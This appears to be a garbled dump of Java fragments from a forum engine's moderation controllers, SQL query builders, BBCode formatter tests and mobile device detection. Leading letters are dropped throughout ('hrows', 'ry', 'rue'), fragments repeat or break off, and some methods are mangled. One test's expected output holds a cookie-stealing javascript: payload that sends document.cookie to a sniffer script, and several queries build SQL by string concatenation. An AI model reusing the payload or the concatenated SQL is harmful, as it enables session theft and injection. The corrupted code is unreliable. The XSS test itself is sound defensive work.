(SELECT msgid FROM tags WHERE tagid= " ) . append ( agid ) . append ( ')' ) ; } } else { hrow new UserErrorException ( " Tag not found " ) ; } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, groups.id as guid, " + " opics.url, topics.linktext, imagepost, vote, sections.name as pname, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, bbcode, " + " sections.id as section, NOT topics.sticky AS ssticky, sections.moderate " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where + ' ' + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . oString ( ) ; } 
public boolean evaluate ( Object o ) { return mkdefprofile . isBox ( ( String ) o ) ; } 
public static List < Group > getGroups ( Connection db , Section section ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, imagepost, vote, section, havelink, linktext, sections.name as sname, title, image, restrict_topics, restrict_comments, stat1,stat2,stat3,groups.id,groups.info,groups.longinfo FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) hrows SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; itle = rs . getString ( " itle " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; restrictComments = rs . getInt ( " restrict_comments " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; longInfo = rs . getString ( " longinfo " ) ; } 
public ModelAndView showForm ( @RequestParam ( " group " ) int id , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; ry { db = dataSource . getConnection ( ) ; 
public ModelAndView modifyGroup ( @RequestParam ( " group " ) int id , @RequestParam ( " info " ) String info , @RequestParam ( " longinfo " ) String longInfo , @RequestParam ( value = " preview " , required = false ) String preview , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; ry { db = dataSource . getConnection ( ) ; 
public ModelAndView loginForm ( ) hrows Exception { return new ModelAndView ( " login-form " ) ; } 
public ModelAndView activateForm ( ) hrows Exception { return new ModelAndView ( " activate " ) ; } 
public ModelAndView activateForm ( ) hrows Exception { return new ModelAndView ( " activate " ) ; } 
public ModelAndView modifyUser ( HttpServletRequest request , HttpSession session , @RequestParam ( " action " ) String action , @RequestParam ( " id " ) int id ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " ime " ) String ime ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( ime ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( ime ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( ime ) ) { } else if ( " custom " . equals ( ime ) ) { int days = new ServletParameterParser ( request ) . getInt ( " ban_days " ) ; if ( days < = 0 | | days > 180 ) { hrow new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp s ; if ( " unlim " . equals ( ime ) ) { s = null ; } else { s = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public static Poll getPollByTopic ( Connection db , int msgid ) hrows SQLException , PollNotFoundException { PreparedStatement pst = db . prepareStatement ( " SELECT votenames.id FROM votenames,topics WHERE topics.id=? AND votenames.topic=topics.id " ) ; pst . clearParameters ( ) ; pst . setInt ( 1 , msgid ) ; ResultSet rs = pst . executeQuery ( ) ; if ( ! rs . next ( ) ) { hrow new PollNotFoundException ( ) ; } return new Poll ( db , rs . getInt ( " id " ) ) ; } 
public ModelAndView showForm ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " msgid " , msgid ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView editVote ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid , @RequestParam ( " id " ) int id , @RequestParam ( " itle " ) String itle ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public boolean evaluate ( Object o ) { return DefaultProfile . isBox ( ( String ) o ) ; } 
public static boolean isStyle ( String style ) { return styleSet . contains ( style ) ; } 
public int doStartTag ( ) hrows JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; String s = object ; if ( StringUtils . isEmpty ( s ) ) { s = " main2 " ; } @SuppressWarnings ( " unchecked " ) List < String > boxnames = ( List < String > ) . getProf ( ) . getObject ( s ) ; CollectionUtils . filter ( boxnames , new Predicate ( ) { @Override public boolean evaluate ( Object o ) { String s = ( String ) o ; return DefaultProfile . isBox ( s ) ; } } ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public boolean evaluate ( Object o ) { String s = ( String ) o ; return DefaultProfile . isBox ( s ) ; } 
private String processMessage ( String msg , String mode , boolean autourl ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; if ( " pre " . equals ( mode ) ) { form . enablePreformatMode ( ) ; } if ( autourl ) { form . enableUrlHighLightMode ( ) ; } if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; } if ( " ex " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; } return form . process ( ) ; } 
public String show ( Connection db ) hrows SQLException , UtilException , UserErrorException { StringBuilder buf = new StringBuilder ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND topics.moderate AND sections.moderate " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( ag ! = null & & ! " " . equals ( ag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " ) ; pst . setString ( 1 , ag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int agid = rs . getInt ( " id " ) ; if ( agid > 0 ) { where . append ( " AND topics.id IN (SELECT msgid FROM tags WHERE tagid= " ) . append ( agid ) . append ( ')' ) ; } } else { hrow new UserErrorException ( " Tag not found " ) ; } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, groups.id as guid, " + " opics.url, topics.linktext, imagepost, vote, sections.name as pname, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, bbcode, " + " sections.id as section, NOT topics.sticky AS ssticky, sections.moderate " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where + ' ' + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . oString ( ) ; } 
public String show ( Connection db ) hrows SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT qq.id, title, postdate, section, topic, userid, rank, message,bbcode FROM ( " + " SELECT " + " msgs.id, title, postdate, section, topic, userid, rank(idxFTI, q) as rank " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100) as qq, plainto_tsquery(?) as q, msgbase WHERE msgbase.id=qq.id " ) ; if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
String show ( Connection db ) hrows SQLException , UtilException , UserErrorException ; String getVariantID ( ProfileHashtable prof ) hrows UtilException ; Date getExpire ( ) ; } 
private String processMessage ( String msg , String mode , boolean autourl ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; if ( autourl ) { form . enableUrlHighLightMode ( ) ; } if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; } if ( " ex " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; } return form . process ( ) ; } 
public void estEntityCrash ( ) { HTMLFormatter formatter = new HTMLFormatter ( GUARANTEED_CRASH ) ; formatter . enableUrlHighLightMode ( ) ; ry { String r = formatter . process ( ) ; 
public List < Message > getMessagesCached ( Connection db , Template mpl ) hrows UtilException , SQLException , UserErrorException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( getVariantID ( mpl . getProf ( ) ) ) ; List < Message > res = ( List < Message > ) mcc . get ( cacheId ) ; if ( res = = null ) { res = getMessages ( db ) ; mcc . add ( cacheId , res , getExpire ( ) ) ; } return res ; } 
public String getVariantID ( ProfileHashtable prof ) hrows UtilException { StringBuilder id = new StringBuilder ( " view-news? " + " &tg= " + URLEncoder . encode ( ag ) ) ; if ( viewAll ) { id . append ( " &v-all=true " ) ; } if ( section ! = 0 ) { id . append ( " &sec= " ) . append ( section ) ; } if ( group ! = 0 ) { id . append ( " &grp= " ) . append ( group ) ; } if ( datelimit ! = null ) { id . append ( " &dlmt= " ) . append ( URLEncoder . encode ( datelimit ) ) ; } if ( limit ! = null & & limit . length ( ) > 0 ) { id . append ( " &lmt= " ) . append ( URLEncoder . encode ( limit ) ) ; } return id . oString ( ) ; } 
public void estJavascriptURL ( ) hrows BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , JAVASCRIPT_URL ) ; assertEquals ( " <p><s>javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s> " , result ) ; } 
public void estCodeExcape ( ) hrows BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [code] \" code&code \" [/code] " ) ; assertEquals ( " <p><div class= \" code \" >&quot;code&amp;code&quot;</div> " , result ) ; } 
public ModelAndView showForm ( @RequestParam ( " msgid " ) int msgid ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " msgid " , msgid ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView deleteComments ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " nick " , required = false ) String nick , @RequestParam ( " reason " ) String reason , @RequestParam ( " bonus " ) int bonus , HttpServletRequest request ) hrows Exception { if ( bonus < 0 | | bonus > 20 ) { hrow new BadParameterException ( " incorrect bonus value " ) ; } Connection db = null ; HttpSession session = request . getSession ( ) ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showForm ( @RequestParam ( " opic " ) int opicId , @RequestParam ( value = " replyto " , required = false ) Integer replyTo , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " opic " , opicId ) ; params . put ( " mode " , mpl . getFormatMode ( ) ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
private String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . enableUrlHighLightMode ( ) ; if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; } if ( " ex " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; } return form . process ( ) ; } 
public String getUserinfo ( Connection db ) hrows SQLException { PreparedStatement st = db . prepareStatement ( " SELECT userinfo FROM users where id=? " ) ; st . setInt ( 1 , id ) ; ResultSet rs = st . executeQuery ( ) ; rs . next ( ) ; return rs . getString ( " userinfo " ) ; } 
public void setUserinfo ( Connection db , String ext ) hrows SQLException { PreparedStatement st = db . prepareStatement ( " UPDATE users SET userinfo=? where id=? " ) ; st . setString ( 1 , ext ) ; st . setInt ( 2 , id ) ; st . executeUpdate ( ) ; } 
public static void setUserinfo ( Connection db , int id , String ext ) hrows SQLException { PreparedStatement st = db . prepareStatement ( " UPDATE users SET userinfo=? where id=? " ) ; st . setString ( 1 , ext ) ; st . setInt ( 2 , id ) ; st . executeUpdate ( ) ; } 
public String getUserinfo ( Connection db ) hrows SQLException { PreparedStatement st = db . prepareStatement ( " SELECT userinfo FROM users where id=? " ) ; st . setInt ( 1 , id ) ; ResultSet rs = st . executeQuery ( ) ; rs . next ( ) ; String userinfo = rs . getString ( " userinfo " ) ; if ( userinfo = = null ) { return " " ; 
private static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{ "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); return content; } 
public void estCodeExcape ( ) hrows BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [code] \" code&code \" [/code] " ) ; assertEquals ( " <p><pre class=code>&quot;code&amp;code&quot;</pre> " , result ) ; } 
public List < Message > getMessagesCached ( Connection db ) hrows UtilException , SQLException , UserErrorException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( getVariantID ( ) ) ; List < Message > res = ( List < Message > ) mcc . get ( cacheId ) ; if ( res = = null ) { res = getMessages ( db ) ; mcc . add ( cacheId , res , getExpire ( ) ) ; } return res ; } 
public void estCodeExcape ( ) hrows BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [code] \" code&code \" [/code] " ) ; assertEquals ( " <p><pre class=code><p>&quot;code&amp;code&quot;</pre> " , result ) ; } 
public static DeleteInfo getDeleteInfo ( Connection db , int msgid ) hrows SQLException { PreparedStatement pst = null ; ry { pst = db . prepareStatement ( " SELECT nick,reason,users.id as userid, deldate FROM del_info,users WHERE msgid=? AND users.id=del_info.delby " ) ; 
private CharSequence processSimpleTag ( Connection db , RegexTag ag , CharSequence data ) hrows SQLException { StringBuffer sb2 = new StringBuffer ( ( int ) ( data . length ( ) * 1.5 ) ) ; ag . substitute ( db , data , sb2 , ag , ag . getReplacement ( ) ) ; return sb2 ; } 
public String getProcessedMessage ( Connection db ) hrows SQLException { return getProcessedMessage ( db , false ) ; } 
public String getProcessedMessage ( Connection db , boolean includeCut ) hrows SQLException { if ( lorcode ) { BBCodeProcessor proc = new BBCodeProcessor ( ) ; 
private void pingFeedburner ( ) { ry { config . setServerURL ( new URL ( " http:ping.feedburner.com/ " ) ) ; 
public void estUnexceptedCut ( ) hrows BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( rue ) ; String result = proc . preparePostText ( null , " [list][*][cut][/cut][/list] " ) ; assertEquals ( " <p><ul><li></ul> " , result ) ; } 
public void estBBinListType ( ) hrows SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [b][list= \" [/b] \" ][/list] " ) ; assertEquals ( " <p>[b]<ol type= \" &#91;/b&#93; \" ></ol> " , result ) ; } 
public static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{ "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); return content; } 
public ModelAndView removeUserpic ( HttpServletRequest request , HttpSession session , @RequestParam ( " id " ) int id ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not autorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public String show ( Connection db ) hrows SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT qq.id, title, postdate, topic, userid, rank, message,bbcode FROM ( " + " SELECT " + " msgs.id, title, postdate, topic, userid, rank(idxFTI, q) as rank " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100) as qq, plainto_tsquery(?) as q, msgbase WHERE msgbase.id=qq.id " ) ; if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
public ModelAndView showForm ( @RequestParam ( " msgid " ) int msgid , HttpServletRequest request ) hrows Exception { Connection db = null ; ry { Message msg = new Message ( db , msgid ) ; 
public ModelAndView deleteMessage ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " nick " , required = false ) String nick , @RequestParam ( " reason " ) String reason , @RequestParam ( value = " bonus " , required = false ) Integer bonus , HttpServletRequest request ) hrows Exception { HttpSession session = request . getSession ( ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showForm ( @RequestParam ( " msgid " ) int msgid , HttpServletRequest request ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showNews ( @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " section " , required = false ) Integer sectionid , @RequestParam ( value = " group " , required = false ) Integer groupid , @RequestParam ( value = " ag " , required = false ) String ag , @RequestParam ( value = " offset " , required = false ) Integer offset , HttpServletResponse response ) hrows Exception { Connection db = null ; Map < String , Object > params = new HashMap < String , Object > ( ) ; ry { if ( month = = null ) { 
private void createReplyTo ( Integer replyTo , Map < String , Object > params , Connection db ) hrows SQLException , MessageNotFoundException { if ( replyTo ! = null & & replyTo > 0 ) { Comment onComment = new Comment ( db , replyTo ) ; 
public boolean detectIphone ( ) { The iPod touch says it's an iPhone! So let's disambiguate. if (userAgent.indexOf(deviceIphone) != -1 && !detectIpod()) { return true; } return false; } 
public boolean detectIpod ( ) { if ( userAgent . indexOf ( deviceIpod ) ! = - 1 ) { return rue ; } return false ; } 
public boolean detectIphoneOrIpod ( ) { We repeat the searches here because some iPods may report themselves as an iPhone, which would be okay. if (userAgent.indexOf(deviceIphone) != -1 || userAgent.indexOf(deviceIpod) != -1) { return true; } return false; } 
public boolean detectAndroid ( ) { if ( userAgent . indexOf ( deviceAndroid ) ! = - 1 ) { return rue ; } return false ; } 
public boolean detectAndroidWebKit ( ) { if ( detectAndroid ( ) & & detectWebkit ( ) ) { return rue ; } return false ; } 
public boolean detectWebkit ( ) { if ( userAgent . indexOf ( engineWebKit ) ! = - 1 ) { return rue ; } return false ; } 
public boolean detectS60OssBrowser ( ) { First, test for WebKit, then make sure it's either Symbian or S60. if (detectWebkit() && (userAgent.indexOf(deviceSymbian) != -1 || userAgent.indexOf(deviceS60) != -1)) { return true; } return false; } 
public boolean detectSymbianOS ( ) { if ( userAgent . indexOf ( deviceSymbian ) ! = - 1 | | userAgent . indexOf ( deviceS60 ) ! = - 1 | | userAgent . indexOf ( deviceS70 ) ! = - 1 | | userAgent . indexOf ( deviceS80 ) ! = - 1 | | userAgent . indexOf ( deviceS90 ) ! = - 1 ) { return rue ; } return false ; } 
public boolean detectWindowsMobile ( ) { Most devices use 'Windows CE', but some report 'iemobile' and some older ones report as 'PIE' for Pocket IE. if (userAgent.indexOf(deviceWinMob) != -1 || userAgent.indexOf(deviceIeMob) != -1 || userAgent.indexOf(enginePie) != -1 || (detectWapWml() && userAgent.indexOf(deviceWindows) != -1)) { return true; } return false; } 
public boolean detectBlackBerry ( ) { if ( userAgent . indexOf ( deviceBB ) ! = - 1 | | httpAccept . indexOf ( vndRIM ) ! = - 1 ) { return rue ; } return false ; } 
public boolean detectPalmOS ( ) { Most devices nowadays report as 'Palm', but some older ones reported as Blazer or Xiino. if (userAgent.indexOf(devicePalm) != -1 || userAgent.indexOf(engineBlazer) != -1 || userAgent.indexOf(engineXiino) != -1) { return true; } return false; } 
public boolean detectSmartphone ( ) { return ( detectIphoneOrIpod ( ) | | detectS60OssBrowser ( ) | | 
public boolean detectBrewDevice ( ) { if ( userAgent . indexOf ( deviceBrew ) ! = - 1 ) { return rue ; } return false ; } 
public boolean detectDangerHiptop ( ) { if ( userAgent . indexOf ( deviceDanger ) ! = - 1 | | userAgent . indexOf ( deviceHiptop ) ! = - 1 ) { return rue ; } return false ; } 
public boolean detectOperaMobile ( ) { if ( userAgent . indexOf ( engineOpera ) ! = - 1 & & ( userAgent . indexOf ( mini ) ! = - 1 | | userAgent . indexOf ( mobi ) ! = - 1 ) ) { return rue ; } return false ; } 
public boolean detectWapWml ( ) { if ( httpAccept . indexOf ( vndwap ) ! = - 1 | | httpAccept . indexOf ( wml ) ! = - 1 ) { return rue ; } return false ; } 
public boolean detectMobileQuick ( ) { Ordered roughly by market share, WAP/XML > Brew > Smartphone. if (detectWapWml()) { return true; } if (detectBrewDevice()) { return true; } Updated by AHand if (detectOperaMobile()) { return true; } if (userAgent.indexOf(engineUpBrowser) != -1) { return true; } if (userAgent.indexOf(engineOpenWeb) != -1) { return true; } if (userAgent.indexOf(deviceMidp) != -1) { return true; } if (detectSmartphone()) { return true; } if (detectDangerHiptop()) { return true; } if (detectMidpCapable()) { return true; } if (userAgent.indexOf(devicePda) != -1) { return true; } if (userAgent.indexOf(mobile) != -1) { return true; } detect older phones from certain manufacturers and operators. if (userAgent.indexOf(uplink) != -1) { return true; } if (userAgent.indexOf(manuSonyEricsson) != -1) { return true; } if (userAgent.indexOf(manuericsson) != -1) { return true; } if (userAgent.indexOf(manuSamsung1) != -1) { return true; } if (userAgent.indexOf(svcDocomo) != -1) { return true; } if (userAgent.indexOf(svcKddi) != -1) { return true; } if (userAgent.indexOf(svcVodafone) != -1) { return true; } return false; } 
public boolean detectSonyPlaystation ( ) { if ( userAgent . indexOf ( devicePlaystation ) ! = - 1 ) { return rue ; } return false ; } 
public boolean detectNintendo ( ) { if ( userAgent . indexOf ( deviceNintendo ) ! = - 1 | | userAgent . indexOf ( deviceWii ) ! = - 1 | | userAgent . indexOf ( deviceNintendoDs ) ! = - 1 ) { return rue ; } return false ; } 
public boolean detectXbox ( ) { if ( userAgent . indexOf ( deviceXbox ) ! = - 1 ) { return rue ; } return false ; } 
public boolean detectGameConsole ( ) { if ( detectSonyPlaystation ( ) | | detectNintendo ( ) | | detectXbox ( ) ) { return rue ; } return false ; } 
public boolean detectMidpCapable ( ) { if ( userAgent . indexOf ( deviceMidp ) ! = - 1 | | httpAccept . indexOf ( deviceMidp ) ! = - 1 ) { return rue ; } return false ; } 
public boolean detectMaemoTablet ( ) { if ( userAgent . indexOf ( maemo ) ! = - 1 ) { return rue ; } else if ( userAgent . indexOf ( maemoTablet ) ! = - 1 & & userAgent . indexOf ( linux ) ! = - 1 ) { return rue ; } return false ; } 
public boolean detectArchos ( ) { if ( userAgent . indexOf ( deviceArchos ) ! = - 1 ) { return rue ; } return false ; } 
public boolean detectSonyMylo ( ) { if ( userAgent . indexOf ( manuSony ) ! = - 1 & & ( userAgent . indexOf ( qtembedded ) ! = - 1 | | userAgent . indexOf ( mylocom2 ) ! = - 1 ) ) { return rue ; } return false ; } 
public boolean detectMobileLong ( ) { if ( detectMobileQuick ( ) | | detectMaemoTablet ( ) | | detectGameConsole ( ) ) { return rue ; } return false ; } 
public boolean detectTierIphone ( ) { if ( detectIphoneOrIpod ( ) | | detectAndroid ( ) | | detectAndroidWebKit ( ) ) { return rue ; } return false ; } 
public boolean detectTierSmartphones ( ) { if ( detectSmartphone ( ) & & ( ! detectTierIphone ( ) ) ) { return rue ; } return false ; } 
public boolean detectTierOtherPhones ( ) { if ( detectMobileQuick ( ) & & ( ! detectTierIphone ( ) ) & & ( ! detectTierSmartphones ( ) ) ) { return rue ; } return false ; } 
public boolean isMobile ( ) { if ( ! style . equals ( " ango " ) ) { return false ; } return userAgent . detectAndroidWebKit ( ) ; } 
public ModelAndView vote ( HttpServletRequest request , @RequestParam ( " vote " ) int vote , @RequestParam ( " voteid " ) int voteid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showUserTopics ( @RequestParam ( " nick " ) String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , HttpServletResponse response ) hrows Exception { Connection db = null ; Map < String , Object > params = new HashMap < String , Object > ( ) ; ry { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 1000 ) ; 
private int fixOffset ( Integer offset ) { if ( offset ! = null ) { if ( offset < 0 ) { 
public void estCodeExcape ( ) hrows BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [code] \" code&code \" [/code] " ) ; assertEquals ( " <p><pre class=code><p>&quot;code&amp;code&quot;</pre><p> " , result ) ; } 
